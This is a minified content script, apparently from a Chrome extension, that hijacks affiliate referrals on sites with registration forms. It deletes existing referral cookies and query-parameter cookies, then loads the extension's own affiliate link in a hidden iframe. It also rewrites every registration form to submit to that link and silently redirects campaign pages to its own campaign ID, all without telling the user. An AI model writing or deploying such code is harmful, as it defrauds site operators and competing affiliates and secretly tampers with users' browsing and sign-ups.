'use strict';
(async () => {
    if (!(await chrome.storage.local.get("isReglink")).isReglink) {
        var a = (await chrome.storage.local.get("configuration")).configuration.affiliateData.affiliates.find(c => 23 == c.id) || {};
        if (a.code) try {
            let c = document.getElementsByTagName("script");
            for (let g = 0; g < c.length; g++) try {
                let e = c[g].innerHTML;
                switch (e.indexOf("var APP") + 1 ? "app" : e.indexOf('$("#client-reg-form").submit') + 1 ? "campaign" : !1) {
                    case "app":
                        try {
                            if ("undefined" == typeof JSON.parse(e.match(/\{.*\}/)[0]).url) throw !0;
                        } catch {
                            continue
                        }
                        if (document.querySelector(".user-data")) continue;
                        if (location.href.indexOf(a.linkPath) + 1) continue;
                        let h = new URL(location.href),
                            l = Object.fromEntries(new URLSearchParams(h.search));
                        if (l.utm_campaign && a.scode.includes(l.utm_campaign)) return;
                        var b = {
                            a: !0,
                            ac: !0,
                            reg_url: !0,
                            link_id: !0
                        };
                        try {
                            Object.assign(b, Object.fromEntries(new URLSearchParams(new URLSearchParams(h.search))))
                        } catch {}
                        for (let f in b) await chrome.runtime.sendMessage({
                            event: "cookiesRemove",
                            name: f,
                            url: h.origin
                        });
                        let k = document.createElement("iframe");
                        k.setAttribute("src", a.linkPath);
                        k.setAttribute("style",
                            "display: none;");
                        document.querySelector("html").append(k);
                        let m = document.getElementsByTagName("form");
                        for (b = 0; b < m.length; b++) {
                            let f = m[b];
                            f.action.indexOf("register") + 1 && (f.action = a.linkPath)
                        }
                        break;
                    case "campaign":
                        let d = (new URL(window.location.href)).href.split("/"); + d[d.length - 1] != a.campaignId && (d[d.length - 1] = a.campaignId, window.location.replace(d.join("/")))
                }
            } catch (e) {}
        } catch (c) {}
    }
})();